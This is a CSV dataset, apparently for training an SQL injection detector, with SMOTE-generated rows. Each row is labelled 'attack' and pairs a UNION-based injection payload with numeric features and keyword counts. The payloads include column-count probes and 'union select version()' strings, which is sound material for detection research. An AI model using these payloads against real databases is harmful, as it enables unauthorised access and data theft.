id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000113,attack,union,"-7138"" union all select 2341,2341,2341,2341--",nearest_attack_euclidean,R001291,0.4045439427859396,42.63502077973051,19.527004155946102,3.9703332367216606,14.0,18.10801662378441,4.0,6.527004155946102,0.3295053939354293,0.4234224069309379,0.09414439826726555,0.15292780086636723,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.527004155946102,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000114,attack,union,"-8794   )    )     )   union all select 5802,5802,5802--",nearest_attack_euclidean,R001207,0.16580774218826197,55.089581666879624,20.817916333375926,3.6839150307566806,14.0,15.271665333503702,18.0,7.817916333375925,0.2544628349662763,0.27653359664080296,0.32716650209949816,0.14183706629342255,0.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.8179163333759254,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000115,attack,union,"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",nearest_attack_euclidean,R001385,0.30074479870957677,70.34834738478656,18.539338953914623,3.4706391012135467,14.0,41.078677907829245,4.0,11.269669476957311,0.1992015543699546,0.5837240266840493,0.05691472981998702,0.16015968912600909,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.269669476957311,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000116,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001642,0.762196242126397,67.17462055612202,17.0,3.210734990017983,43.65075888775596,1.0,11.523861668366058,11.0,0.6503826963035385,0.014889790428671557,0.17093981855240278,0.1637876947153872,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.5873102780610098,1.0,0.0,6.412689721938991,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000117,attack,union,"1""  )   as jiyl where 4893  =  4893 union all select null,null,null,null,null#",nearest_attack_euclidean,R001098,0.020674283784684496,78.02346847782717,25.988265761086417,3.944894648563945,44.953063044345676,9.0,16.070405433481486,8.0,0.5761671211469135,0.11535076661851851,0.2059480974625515,0.10253401477201646,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0117342389135813,0.0,0.0,3.988265761086419,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000118,attack,union,"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",nearest_attack_euclidean,R001620,0.3915454076139122,74.08141358346168,23.77035339586542,3.855521861069071,41.31106018759626,9.0,14.77035339586542,9.0,0.5571242901701425,0.12181623778727846,0.19924323425530063,0.12181623778727846,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000119,attack,union,"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",nearest_attack_euclidean,R000835,0.5528297690526103,73.89854289043454,22.179708578086906,3.793399901450215,14.0,32.71883431234763,14.0,13.179708578086908,0.19031304666929044,0.4411239691379095,0.19031304666929044,0.17824993752350968,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,6.179708578086908,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000120,attack,union,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",nearest_attack_euclidean,R000210,0.16841331908987026,75.88778440285463,20.177556880570926,3.2851586036017624,14.0,36.7102275222837,14.0,11.177556880570926,0.1847170224878487,0.483342247163688,0.18471702248784866,0.14722370786061467,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.177556880570926,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000121,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000053,2.9200193199910854e-07,97.0,27.0,3.7712694510833757,49.0,3.0,33.0,12.0,0.5051546391752577,0.030927835051546365,0.3402061855670103,0.12371134020618557,0.0,1.0,2.0,0.0,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000122,attack,union,"-2434  )   union all select 8310,8310,8310,8310,8310--",nearest_attack_euclidean,R000754,0.0044741635578556685,53.969425351242776,20.0,3.9423852621130466,14.0,23.975540280994224,8.0,7.993885070248556,0.2594210298876043,0.44422258758271405,0.14824058850720248,0.14811579402247912,0.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.993885070248556,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000123,attack,union," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000147,0.23048974264261077,83.0,28.378510846993528,3.970254486558692,43.0,3.6214891530064737,25.0,11.378510846993526,0.5180722891566265,0.04363239943381292,0.30120481927710846,0.13709049213245214,2.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000124,attack,union,-8378%'  )   union all select 5491#,nearest_attack_euclidean,R001535,0.5389782585212926,36.655619806371185,22.763482884804116,4.050100822710719,14.0,8.0,9.419102691175304,5.236517115195884,0.3842321923202744,0.2195612527544425,0.2533494120681402,0.14285714285714285,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.2365171151958843,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000125,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000445,0.01701819810772514,77.0,16.0,3.098802338589076,46.047316758473926,1.0,17.952683241526074,12.0,0.5980171007594016,0.012987012987012991,0.23315173040942955,0.15584415584415584,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.9881708103815185,0.0,0.0,7.0118291896184815,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000126,attack,union," select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000148,0.29761653427041773,87.89300901663405,27.0,3.7897468267593046,42.0,4.776747745841487,29.89300901663406,11.223252254158513,0.4780211723255488,0.05445396094543878,0.339875523931385,0.1276493427976274,0.0,1.0,2.0,0.0,1.0,2.0,0.0,2.223252254158514,0.0,0.0,1.0,5.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000127,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000049,0.0,81.0,27.0,3.8852146856306904,42.0,4.0,25.0,10.0,0.5185185185185185,0.04938271604938271,0.30864197530864196,0.12345679012345678,0.0,1.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000128,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000033,0.0,77.0,27.0,3.94638244365072,40.0,3.0,23.0,11.0,0.5194805194805194,0.038961038961038974,0.2987012987012987,0.14285714285714285,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000129,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000586,0.2171974883112315,56.62702664451612,19.325405328903223,3.8248856023159212,14.0,29.3016213156129,4.0,9.325405328903225,0.24764291726568916,0.5169795231249266,0.07075511921876831,0.16462244039061583,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.325405328903225,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000130,attack,union,"1"" where 8241  =  8241 union all select null,null,null#",nearest_attack_euclidean,R000509,1.2626938717897005,56.84933724313352,23.38700293235014,4.0282135575583515,25.451988270599436,15.935014661750703,10.0,5.462334310783381,0.4519352543438613,0.2760498524524151,0.17611914562978884,0.09589574757393476,0.0,1.0,0.46233431078338016,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,1.4623343107833802,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000131,attack,union,1%'  )   union all select null#,nearest_attack_euclidean,R000818,0.33457731075607006,32.91094706027642,16.382189412055283,3.5324244658725217,19.528757648221138,1.0,8.0,4.3821894120552844,0.5922889247400356,0.030545746361759468,0.2443659708940758,0.13279935800412915,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.38218941205528445,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000132,attack,union,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",nearest_attack_euclidean,R000387,0.12452028274870601,60.0,19.40144691892723,3.7884548328959493,14.0,32.0,4.0,10.0,0.23333333333333334,0.5333333333333333,0.06666666666666665,0.16666666666666666,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000133,attack,union,"-3781  )   union all select 3916,3916,3916--",nearest_attack_euclidean,R001006,0.08348768368895804,44.534228252118346,20.0,3.9724519399046225,14.0,16.427382601694674,8.0,6.106845650423669,0.31471280355767306,0.3683938694066198,0.17983588774724177,0.13705743928846537,0.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.1068456504236686,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000134,attack,union,"-2365   )    )    union all select 8190,8190#",nearest_attack_euclidean,R001634,0.45430728307565243,47.31131080803961,22.075475676784155,3.8544814403473624,14.0,13.849048646431688,14.0,5.4622621616079226,0.2967296216388646,0.2913206486190892,0.2967296216388646,0.11522010810318152,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.4622621616079226,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,union,"1'+  (  select 'gqsk' where 3087  =  3087 union all select null,null,null,null--",nearest_attack_euclidean,R000346,0.06999601017522644,80.41810819227544,27.832756723089823,4.156127103351919,45.334486553820355,9.0,15.0,11.083621638455089,0.5636682434784166,0.11194662151022367,0.18657770251703945,0.13780743249432018,3.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.0836216384550887,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000136,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000205,0.031219307693680722,55.0,21.874119192612646,4.034082749038496,14.0,24.0,8.0,9.0,0.2545454545454545,0.43636363636363634,0.14545454545454545,0.16363636363636364,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,4.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000137,attack,union,"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",nearest_attack_euclidean,R000434,0.46372817443530034,84.42455242699133,21.515089514601733,3.641372711960022,14.0,37.93964194159307,18.0,14.484910485398267,0.16597368461201595,0.4490842096774521,0.21339473735830614,0.17154736835222587,0.0,1.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,7.484910485398267,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000138,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001645,0.3012699636034474,67.60627594734713,14.0,2.9308304262822285,52.0850207578777,1.0,4.0,10.521255189469425,0.7701850784142064,0.01490746079289687,0.0596298431715874,0.15527761762130945,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.521255189469425,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000139,attack,union,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",nearest_attack_euclidean,R000318,0.07447510369179935,64.42497923106542,21.0,3.9396442826627656,14.0,31.539983384852334,8.0,10.884995846213084,0.21763644496925433,0.4890907929010653,0.1243636828395739,0.16890907929010654,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.884995846213084,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000140,attack,union,"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",nearest_attack_euclidean,R000590,0.07022444588650502,112.43205635863093,29.0,4.049008723561002,29.0,51.545645086904756,15.0,16.88641127172619,0.2580522695763986,0.458303201664355,0.13347531184986133,0.15016921690938512,3.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,8.886411271726187,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000141,attack,union,"-7111 union all select 2409,2409,2409,2409,2409,2409#",nearest_attack_euclidean,R001235,0.2423404971956365,51.758364219460496,19.7516728438921,3.87759265927236,14.0,27.006691375568398,4.0,6.751672843892099,0.2709838447042268,0.5212737597327952,0.07742395562977909,0.1303184399331988,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.751672843892099,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000142,attack,union,"-5866'   )    )    as phzq where 3803  =  3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",nearest_attack_euclidean,R000782,0.3564230360443254,107.8051397357389,27.0,3.781890155388333,25.0,46.24411178859113,22.0,14.561027947147782,0.23228749537114096,0.42834000740617445,0.20441299592660409,0.13495950129608053,1.0,0.0,3.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,7.561027947147781,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000143,attack,union,"-9947""   )    )     )   union all select 8765,8765,8765,8765,8765#",nearest_attack_euclidean,R001276,0.28483108289439757,64.96336060871933,22.0,3.7888944892874776,14.0,24.0,17.17068848697546,9.792672121743866,0.2157260187476228,0.36981603213878195,0.26376675339876615,0.15069119571482908,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.7926721217438653,0.0,0.0,4.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000144,attack,union,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",nearest_attack_euclidean,R000303,0.00012582649217386294,77.9991859722422,24.000244208327338,4.034779032154538,25.0,27.99934877779377,16.0,8.999837194448443,0.32051665737065327,0.3589690794579812,0.20513066071721806,0.11538360245414755,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.9998371944484417,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000145,attack,union,"-8609' union all select 9384,9384,9384,9384--",nearest_attack_euclidean,R001271,0.037169787572026276,45.0,19.922138000242853,4.025597326836531,14.0,20.0,4.0,7.0,0.3111111111111111,0.4444444444444444,0.08888888888888889,0.15555555555555556,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000146,attack,union,"-1432""   )    )    union all select 9008,9008,9008#",nearest_attack_euclidean,R001064,0.051597834634559,50.69863237321529,22.939726474643056,3.8829809393745833,14.0,15.758905898572229,14.0,6.939726474643058,0.27630824670715515,0.31053967726161086,0.2763082467071552,0.13684382932407882,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.9397264746430571,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
